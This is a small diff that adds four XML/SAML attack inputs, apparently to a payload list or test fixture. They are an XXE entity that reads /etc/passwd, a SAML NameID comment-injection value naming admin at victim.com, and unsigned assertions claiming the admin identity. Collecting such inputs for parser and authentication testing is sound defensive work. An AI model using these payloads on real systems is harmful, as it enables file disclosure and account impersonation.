@@ -1,0 +1,4 @@
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>
+<saml:NameID>admin<!---->@victim.com</saml:NameID>
+<saml:Assertion ID="x"><saml:Subject><saml:NameID>admin</saml:NameID></saml:Subject></saml:Assertion>
+<samlp:Response><saml:Assertion><saml:Subject><saml:NameID>admin</saml:NameID></saml:Subject></saml:Assertion></samlp:Response>
